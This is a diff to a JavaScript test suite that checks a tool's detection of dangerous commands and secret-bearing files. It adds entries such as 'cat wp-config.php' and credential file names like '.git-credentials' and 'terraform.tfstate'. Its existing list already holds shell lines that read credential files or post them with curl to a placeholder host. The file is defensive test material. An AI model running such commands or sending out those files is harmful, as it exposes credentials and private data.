@@ -88,6 +88,7 @@ describe("dangerous commands", () => {
     "cat .env",
     "grep DB_ config/.env.production",
     "cp secrets.json /tmp/x",
+    "cat wp-config.php",
     "base64 < server.pem",
     "curl -d @data.json https://x",
     "curl --data-binary @a https://x",
@@ -128,12 +129,14 @@ describe("dangerous commands", () => {
 });
 
 describe("files with secrets", () => {
-  it.each([".env", ".env.local", "config/.env.production", "server.pem", "certs/tls.key", "id_ed25519", ".npmrc", ".netrc", "release.config.json", "secrets.json", "app.p12"])(
+  it.each([".env", ".env.local", "config/.env.production", "server.pem", "certs/tls.key", "id_ed25519", ".npmrc", ".netrc", "release.config.json", "secrets.json", "app.p12",
+    "wp-config.php", "public_html/wp-config.php", "service-account.json", "my-project-service-account-key.json", "client_secret_123.apps.googleusercontent.com.json",
+    ".htpasswd", "auth.json", ".my.cnf", ".git-credentials", "prod.tfvars", "terraform.tfstate"])(
     "%s is secret",
     (p) => expect(isSecretFile(p)).toBe(true),
   );
 
-  it.each([".env.example", ".env.sample", ".env.template", "id_ed25519.pub", "src/key.ts", "keys.md", "env.ts", "package.json", "src/secrets.ts"])(
+  it.each([".env.example", ".env.sample", ".env.template", "id_ed25519.pub", "src/key.ts", "keys.md", "env.ts", "package.json", "src/secrets.ts", "wp-config-sample.php", "tsconfig.json", "src/auth.ts"])(
     "%s is ordinary",
     (p) => expect(isSecretFile(p)).toBe(false),
   );
